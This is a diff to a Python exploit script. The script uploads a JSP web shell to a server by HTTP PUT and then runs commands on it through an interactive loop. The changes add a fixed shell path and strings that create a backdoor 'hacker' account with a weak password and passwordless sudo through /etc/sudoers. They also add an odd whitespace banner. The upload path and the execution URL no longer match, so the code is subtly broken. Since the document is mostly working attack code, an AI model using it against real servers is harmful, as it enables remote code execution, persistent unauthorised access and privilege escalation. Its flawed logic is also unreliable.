@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 import requests
 import urllib.parse
-import random
 
-# Simple JSP RCE payload
+
+shell_name = f"shell.jsp"
+
 JSP_PAYLOAD = """<%@page import="java.io.*"%>
 <%
 String cmd = request.getParameter("cmd");
@@ -17,10 +18,21 @@ if (cmd != null) {
 }
 %>"""
 
+add_user = """sudo useradd -m -s /bin/bash -G sudo hacker && echo "hacker:12345" | sudo chpasswd && echo "hacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers"""
+remove_user = """sudo deluser --remove-home hacker"""
+
+
+Banner = """
+                                                                                                                                                                                                                                                                                                                                                                                                  
+"""
+
+
+
+
+
 def upload_shell(target):
-    shell_name = f"shell_{random.randint(1000,9999)}.jsp"
-    shell_url = f"{target.rstrip('/')}/{shell_name}"
-    
+    shell_url = f"{target.rstrip('/')}/upload/{shell_name}"
+
     try:
         response = requests.put(
             shell_url,
@@ -28,14 +40,15 @@ def upload_shell(target):
             data=JSP_PAYLOAD,
             timeout=10
         )
-        
+
         if response.status_code in [200, 201, 204]:
             print(f"[+] Shell uploaded to: {shell_url}")
-            return shell_url
+            return True
         print(f"[-] Upload failed (HTTP {response.status_code})")
     except Exception as e:
         print(f"[-] Upload error: {e}")
     return None
+
 
 def execute_command(shell_url, command):
     try:
@@ -49,14 +62,16 @@ def execute_command(shell_url, command):
         print(f"[-] Execution error: {e}")
     return None
 
+
 def main():
     target = "http://127.0.0.1:8080/Rito"
-    
+
     # Upload shell
-    shell_url = upload_shell(target)
-    if not shell_url:
+    if not upload_shell(target):
         return
-    
+
+    shell_url = target + "/" + shell_name
+
     # Test command execution
     print("\nEnter commands to execute (or 'exit' to quit):")
     while True:
@@ -65,9 +80,10 @@ def main():
             break
         if not cmd.strip():
             continue
-            
+
         result = execute_command(shell_url, cmd)
         print(result if result else "[No output]")
+
 
 if __name__ == "__main__":
     main()
